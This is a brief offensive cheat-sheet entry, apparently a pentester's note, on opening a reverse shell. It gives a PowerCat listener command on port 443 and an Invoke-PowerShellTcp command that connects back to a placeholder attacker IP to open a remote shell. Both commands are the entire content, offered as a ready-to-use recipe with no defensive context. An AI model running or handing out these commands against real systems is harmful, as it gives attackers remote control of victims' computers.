Setting up a reverse shell with PowerCat
`powercat -l -v -p 443 -t 100`

Trigger the reverse shell
`Invoke-PowerShellTcp -Reverse -IPAddress <attacker-ip> -Port <portnumber>`